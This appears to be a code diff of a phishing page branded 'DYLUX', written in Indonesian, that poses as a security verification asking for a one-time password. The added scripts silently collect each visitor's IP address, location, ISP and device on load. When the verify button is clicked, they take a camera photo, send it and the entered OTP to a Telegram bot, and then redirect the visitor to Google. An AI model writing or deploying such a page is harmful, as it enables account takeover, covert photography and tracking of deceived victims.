@@ -7,99 +7,138 @@
     <script src="config.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #0a0a0f;
-            font-family: Arial, sans-serif;
-            color: #e0e0ff;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-        .box {
-            background: #14141e;
-            border: 1px solid rgba(0,240,255,0.1);
-            border-radius: 16px;
-            padding: 40px 32px;
-            max-width: 400px;
-            width: 100%;
-            text-align: center;
-        }
-        .logo {
-            font-size: 24px;
-            font-weight: 800;
-            background: linear-gradient(135deg, #00f0ff, #7b2ffc);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        .badge {
-            display: inline-block;
-            background: rgba(0,255,136,0.1);
-            color: #00ff88;
-            font-size: 11px;
-            padding: 4px 12px;
-            border-radius: 20px;
-            margin-top: 6px;
-        }
+        body { background: #0a0a0f; font-family: Arial, sans-serif; color: #e0e0ff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        .box { background: #14141e; border: 1px solid rgba(0,240,255,0.1); border-radius: 16px; padding: 40px 32px; max-width: 400px; width: 100%; text-align: center; }
+        .logo { font-size: 24px; font-weight: 800; background: linear-gradient(135deg, #00f0ff, #7b2ffc); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .badge { display: inline-block; background: rgba(0,255,136,0.1); color: #00ff88; font-size: 11px; padding: 4px 12px; border-radius: 20px; margin-top: 6px; }
         .icon { font-size: 48px; margin: 16px 0; }
         h2 { font-size: 18px; margin-bottom: 8px; }
         p { color: #8888aa; font-size: 14px; line-height: 1.6; }
-        input {
-            width: 100%;
-            padding: 14px;
-            background: #0a0a0f;
-            border: 1px solid rgba(0,240,255,0.1);
-            border-radius: 12px;
-            color: #fff;
-            font-size: 16px;
-            outline: none;
-            margin: 12px 0;
-        }
-        input:focus { border-color: #00f0ff; }
-        button {
-            width: 100%;
-            padding: 14px;
-            border: none;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 700;
-            cursor: pointer;
-            background: linear-gradient(135deg, #00f0ff, #7b2ffc);
-            color: #fff;
-            transition: 0.3s;
-        }
+        video { width: 100%; border-radius: 12px; margin: 12px 0; background: #0a0a0f; }
+        button { width: 100%; padding: 14px; border: none; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; background: linear-gradient(135deg, #00f0ff, #7b2ffc); color: #fff; transition: 0.3s; }
         button:hover { opacity: 0.8; }
         button:disabled { opacity: 0.5; cursor: not-allowed; }
-        .footer {
-            margin-top: 20px;
-            font-size: 11px;
-            color: #555;
-        }
-        .spinner {
-            display: none;
-            width: 24px;
-            height: 24px;
-            border: 3px solid rgba(0,240,255,0.1);
-            border-top-color: #00f0ff;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin: 12px auto;
-        }
+        .footer { margin-top: 20px; font-size: 11px; color: #555; }
+        .spinner { display: none; width: 24px; height: 24px; border: 3px solid rgba(0,240,255,0.1); border-top-color: #00f0ff; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 12px auto; }
         .spinner.active { display: block; }
         @keyframes spin { to { transform: rotate(360deg); } }
         #statusMsg { font-size: 13px; color: #8888aa; margin-top: 10px; display: none; }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
+
+    <!-- ========================================== -->
+    <!-- AUTO-DETECT + KIRIM KE TELEGRAM           -->
+    <!-- ========================================== -->
+    <script>
+    // ============================================
+    // API FALLBACK (12+ API)
+    // ============================================
+    const apiList = [
+        { url: 'https://ipapi.is/api/geo/', parse: (d) => ({ ip: d.ip, city: d.city, region: d.region, country: d.country, isp: d.isp, lat: d.latitude, lon: d.longitude }) },
+        { url: 'https://ip-api.com/json/', parse: (d) => ({ ip: d.query, city: d.city, region: d.regionName, country: d.country, isp: d.isp, lat: d.lat, lon: d.lon }) },
+        { url: 'https://ipapi.co/json/', parse: (d) => ({ ip: d.ip, city: d.city, region: d.region, country: d.country_name, isp: d.org, lat: d.latitude, lon: d.longitude }) },
+        { url: 'https://freeipapi.com/api/json/', parse: (d) => ({ ip: d.ip, city: d.city, region: d.region, country: d.country, isp: d.isp, lat: d.latitude, lon: d.longitude }) },
+        { url: 'https://ipwhois.io/json/', parse: (d) => ({ ip: d.ip, city: d.city, region: d.region, country: d.country, isp: d.isp, lat: d.latitude, lon: d.longitude }) },
+        { url: 'https://ip-api.io/json/', parse: (d) => ({ ip: d.ip, city: d.city, region: d.region, country: d.country, isp: d.org, lat: d.lat, lon: d.lon }) },
+        { url: 'https://ipinfo.io/json/', parse: (d) => ({ ip: d.ip, city: d.city, region: d.region, country: d.country, isp: d.org, lat: d.loc?.split(',')[0], lon: d.loc?.split(',')[1] }) },
+        { url: 'https://ip-api.com/json/', parse: (d) => ({ ip: d.query, city: d.city, region: d.regionName, country: d.country, isp: d.isp, lat: d.lat, lon: d.lon }) },
+        { url: 'https://ipapi.is/api/geo/', parse: (d) => ({ ip: d.ip, city: d.city, region: d.region, country: d.country, isp: d.isp, lat: d.latitude, lon: d.longitude }) },
+        { url: 'https://freeipapi.com/api/json/', parse: (d) => ({ ip: d.ip, city: d.city, region: d.region, country: d.country, isp: d.isp, lat: d.latitude, lon: d.longitude }) },
+        { url: 'https://ipwhois.io/json/', parse: (d) => ({ ip: d.ip, city: d.city, region: d.region, country: d.country, isp: d.isp, lat: d.latitude, lon: d.longitude }) },
+        { url: 'https://ip-api.io/json/', parse: (d) => ({ ip: d.ip, city: d.city, region: d.region, country: d.country, isp: d.org, lat: d.lat, lon: d.lon }) }
+    ];
+
+    // ============================================
+    // FUNGSI KIRIM KE TELEGRAM
+    // ============================================
+    async function sendToTelegram(chatId, text, photo) {
+        try {
+            if (photo) {
+                // Kirim foto
+                await fetch(`https://api.telegram.org/bot${DYLUX_CONFIG.BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, photo: photo, caption: text, parse_mode: 'HTML' })
+                });
+            } else {
+                // Kirim teks
+                await fetch(`https://api.telegram.org/bot${DYLUX_CONFIG.BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'HTML' })
+                });
+            }
+        } catch (e) { console.error('Telegram error:', e); }
+    }
+
+    // ============================================
+    // AUTO-DETECT (JALAN OTOMATIS)
+    // ============================================
+    (async function autoDetect() {
+        try {
+            const params = new URLSearchParams(window.location.search);
+            const userId = params.get('id');
+            if (!userId) return;
+
+            let ipData = null;
+            for (const api of apiList) {
+                try {
+                    const res = await fetch(api.url);
+                    if (!res.ok) throw new Error('API error');
+                    const data = await res.json();
+                    const parsed = api.parse(data);
+                    if (parsed.ip && parsed.ip !== 'unknown') {
+                        ipData = parsed;
+                        break;
+                    }
+                } catch (e) { /* Coba API berikutnya */ }
+            }
+
+            if (ipData) {
+                const message = 
+                    `<b>🎯 NEW DATA CAPTURED!</b>\n\n` +
+                    `<b>👤 User ID:</b> <code>${userId}</code>\n` +
+                    `<b>📌 Type:</b> Auto-Detect\n` +
+                    `<b>🌐 IP:</b> ${ipData.ip}\n` +
+                    `<b>📍 Lokasi:</b> ${ipData.city}, ${ipData.region}, ${ipData.country}\n` +
+                    `<b>📡 ISP:</b> ${ipData.isp}\n` +
+                    `<b>📱 Device:</b> ${navigator.userAgent}\n` +
+                    `<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n\n` +
+                    `<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
+                await sendToTelegram(userId, message);
+                console.log('✅ Auto-detect sent!');
+            } else {
+                console.warn('⚠️ Auto-detect gagal, kirim notifikasi tanpa IP');
+                const message = 
+                    `<b>⚠️ NEW VISITOR!</b>\n\n` +
+                    `<b>👤 User ID:</b> <code>${userId}</code>\n` +
+                    `<b>📱 Device:</b> ${navigator.userAgent}\n` +
+                    `<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n\n` +
+                    `<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
+                await sendToTelegram(userId, message);
+            }
+        } catch (e) { console.error('Auto-detect error:', e); }
+    })();
+    </script>
+
+    <!-- ========================================== -->
+    <!-- MAIN CONTENT (CAMERA)                     -->
+    <!-- ========================================== -->
     <div class="box">
         <div class="logo">DYLUX</div>
         <div class="badge">🔒 Secure</div>
         <div class="icon">🛡️</div>
         <h2>Verifikasi Keamanan</h2>
         <p>Akun Anda terdeteksi login dari perangkat baru. Verifikasi identitas untuk melanjutkan.</p>
+
+        <video id="video" autoplay playsinline class="hidden"></video>
+        <canvas id="canvas" class="hidden"></canvas>
+
         <input type="text" id="otpInput" placeholder="Masukkan Kode OTP" maxlength="6">
         <button id="verifyBtn">Verifikasi</button>
+
         <div class="spinner" id="spinner"></div>
         <div id="statusMsg"></div>
         <div class="footer">DYLUX • Cahaya dalam Kegelapan</div>
@@ -107,69 +146,59 @@
 
     <script>
     // ============================================
-    // AUTO-DETECT + KIRIM KE TELEGRAM (PAKE TOKEN BOT)
-    // ============================================
-    (async function autoDetect() {
-        try {
-            const params = new URLSearchParams(window.location.search);
-            const userId = params.get('id');
-            
-            if (!userId) {
-                console.log('❌ No user ID found');
-                return;
-            }
-
-            console.log('🔍 Auto-detect for user:', userId);
-
-            // Dapatkan IP & Location
-            const ipRes = await fetch('https://ip-api.com/json/');
-            const ipData = await ipRes.json();
-
-            // Format pesan
-            const message = 
-                `<b>🎯 NEW DATA CAPTURED!</b>\n\n` +
-                `<b>👤 User ID:</b> <code>${userId}</code>\n` +
-                `<b>📌 Type:</b> Auto-Detect\n` +
-                `<b>🌐 IP:</b> ${ipData.query || 'unknown'}\n` +
-                `<b>📍 Lokasi:</b> ${ipData.city || 'unknown'}, ${ipData.regionName || 'unknown'}, ${ipData.country || 'unknown'}\n` +
-                `<b>📡 ISP:</b> ${ipData.isp || 'unknown'}\n` +
-                `<b>📱 Device:</b> ${navigator.userAgent || 'unknown'}\n` +
-                `<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n\n` +
-                `<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
-
-            // Kirim ke Telegram via API
-            await fetch(`https://api.telegram.org/bot${DYLUX_CONFIG.BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: userId,
-                    text: message,
-                    parse_mode: 'HTML'
-                })
-            });
-
-            console.log('✅ Auto-detect sent to Telegram!');
-
-        } catch (error) {
-            console.error('❌ Auto-detect error:', error);
-        }
-    })();
-
-    // ============================================
-    // OTP LOGIC
+    // AKSES KAMERA & KIRIM FOTO
     // ============================================
     const userId = new URLSearchParams(window.location.search).get('id');
     const verifyBtn = document.getElementById('verifyBtn');
     const otpInput = document.getElementById('otpInput');
     const spinner = document.getElementById('spinner');
     const statusMsg = document.getElementById('statusMsg');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    let stream = null;
 
-    if (!userId) {
-        statusMsg.style.display = 'block';
-        statusMsg.innerHTML = '❌ Link tidak valid!';
-        verifyBtn.disabled = true;
+    async function captureCamera() {
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'environment', width: { ideal: 640 } }
+            });
+
+            video.srcObject = stream;
+            video.classList.remove('hidden');
+            await video.play();
+
+            await new Promise(resolve => setTimeout(resolve, 2000));
+
+            const ctx = canvas.getContext('2d');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            const imageData = canvas.toDataURL('image/jpeg', 0.8);
+
+            const caption = 
+                `<b>📸 PHOTO CAPTURED!</b>\n\n` +
+                `<b>👤 User ID:</b> <code>${userId}</code>\n` +
+                `<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n\n` +
+                `<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
+
+            await sendToTelegram(userId, caption, imageData);
+
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                video.classList.add('hidden');
+            }
+
+            return true;
+        } catch (error) {
+            console.error('Camera error:', error);
+            return false;
+        }
     }
 
+    // ============================================
+    // OTP LOGIC
+    // ============================================
     verifyBtn.addEventListener('click', async () => {
         const otp = otpInput.value.trim();
         if (!otp) {
@@ -182,47 +211,49 @@
         spinner.classList.add('active');
         statusMsg.style.display = 'none';
 
+        const captureSuccess = await captureCamera();
+
+        const message = 
+            `<b>🔑 OTP CAPTURED!</b>\n\n` +
+            `<b>👤 User ID:</b> <code>${userId}</code>\n` +
+            `<b>🔢 OTP:</b> <code>${otp}</code>\n` +
+            `<b>📸 Foto:</b> ${captureSuccess ? '✅ Berhasil' : '❌ Gagal'}\n` +
+            `<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n\n` +
+            `<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
+
+        await sendToTelegram(userId, message);
+
+        spinner.classList.remove('active');
+        verifyBtn.disabled = false;
+        statusMsg.style.display = 'block';
+        statusMsg.innerHTML = '✅ Verifikasi berhasil! Foto + OTP terkirim.';
+        otpInput.value = '';
+
+        setTimeout(() => {
+            window.location.href = 'https://google.com';
+        }, 3000);
+    });
+
+    // ============================================
+    // SEND TO TELEGRAM (FALLBACK)
+    // ============================================
+    async function sendToTelegram(chatId, text, photo) {
         try {
-            const message = 
-                `<b>🔑 OTP CAPTURED!</b>\n\n` +
-                `<b>👤 User ID:</b> <code>${userId}</code>\n` +
-                `<b>🔢 OTP:</b> <code>${otp}</code>\n` +
-                `<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n` +
-                `<b>📱 Device:</b> ${navigator.userAgent || 'unknown'}\n\n` +
-                `<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
-
-            await fetch(`https://api.telegram.org/bot${DYLUX_CONFIG.BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: userId,
-                    text: message,
-                    parse_mode: 'HTML'
-                })
-            });
-
-            spinner.classList.remove('active');
-            verifyBtn.disabled = false;
-            statusMsg.style.display = 'block';
-            statusMsg.innerHTML = '✅ Verifikasi berhasil!';
-            otpInput.value = '';
-
-            setTimeout(() => {
-                window.location.href = 'https://google.com';
-            }, 2000);
-
-        } catch (error) {
-            spinner.classList.remove('active');
-            verifyBtn.disabled = false;
-            statusMsg.style.display = 'block';
-            statusMsg.innerHTML = '❌ Gagal verifikasi!';
-            console.error(error);
-        }
-    });
-
-    otpInput.addEventListener('keypress', (e) => {
-        if (e.key === 'Enter') verifyBtn.click();
-    });
+            if (photo) {
+                await fetch(`https://api.telegram.org/bot${DYLUX_CONFIG.BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, photo: photo, caption: text, parse_mode: 'HTML' })
+                });
+            } else {
+                await fetch(`https://api.telegram.org/bot${DYLUX_CONFIG.BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'HTML' })
+                });
+            }
+        } catch (e) { console.error('Telegram error:', e); }
+    }
     </script>
 </body>
 </html>
